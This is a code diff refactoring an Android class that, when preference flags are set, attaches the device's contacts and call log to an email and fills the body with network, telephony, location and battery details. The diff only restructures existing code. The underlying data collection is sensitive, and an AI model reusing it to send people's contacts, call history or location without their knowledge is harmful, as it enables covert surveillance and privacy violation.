@@ -117,11 +117,8 @@ class EmailAttachmentHelper {
     }
     void attachFiles(GMailSender sender){
         SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(c);
-        boolean incContacts = settings.getBoolean("include_contacts", false);
-        boolean incCallLog = settings.getBoolean("include_calllog", false);
-
         ///contacts
-        if(incContacts) {
+        if(settings.getBoolean("include_contacts", false)) {
             File contact = getContacts();
             if (contact != null) {
                 try {
@@ -130,7 +127,7 @@ class EmailAttachmentHelper {
             }
         }
         //call log
-        if(incCallLog) {
+        if(settings.getBoolean("include_calllog", false)) {
             File calllog = getCallLog();
             if (calllog != null) {
                 try {
@@ -145,8 +142,7 @@ class EmailAttachmentHelper {
         String emailBody = "";
         try {
             final WifiManager wifiManager = (WifiManager) c.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-            ConnectivityManager connMgr = (ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE);
-            NetworkInfo networkInfo = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
+            NetworkInfo networkInfo = ((ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE)).getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
             TelephonyManager telephonyManager = (TelephonyManager)c.getSystemService(Context.TELEPHONY_SERVICE);
 
             LocationService locationService = new LocationService(c);
@@ -171,13 +167,9 @@ class EmailAttachmentHelper {
         }catch(Exception ignored){}
         return emailBody;
     }
-
     private String getBattery(Context c){
-        String life = "Build number low";
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
-            life = String.valueOf(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
-        }
-        return life;
+        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ?
+                String.valueOf(((BatteryManager) c.getSystemService(Context.BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)) :
+                "Build number low";
     }
 }
